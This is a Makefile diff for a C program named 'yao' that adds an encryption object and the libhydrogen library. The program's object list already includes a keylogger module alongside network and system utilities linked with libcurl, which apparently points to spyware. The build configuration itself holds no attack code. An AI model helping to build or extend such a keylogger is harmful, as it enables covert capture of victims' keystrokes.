@@ -1,7 +1,7 @@
 # FLAGS
 CC = gcc
 CFLAGS = -c -Wall -Wextra -std=gnu11 -O0 -g
-LDLIBS = -lpthread -lcurl
+LDLIBS = -lpthread -lcurl $(LIBPATH)libhydrogen.a
 
 TARGET = "yao"
 
@@ -9,8 +9,9 @@ TARGET = "yao"
 SRCPATH = src/
 INCLUDE = include/
 OBJPATH = build/
+LIBPATH = lib/
 
-OBJECTS = $(OBJPATH)core.o $(OBJPATH)network_utils.o $(OBJPATH)system_utils.o $(OBJPATH)keylogger.o
+OBJECTS = $(OBJPATH)core.o $(OBJPATH)network_utils.o $(OBJPATH)system_utils.o $(OBJPATH)keylogger.o $(OBJPATH)encrypt.o
 
 # EXEC CREATION
 $(TARGET): $(OBJPATH) $(OBJPATH) $(OBJECTS)
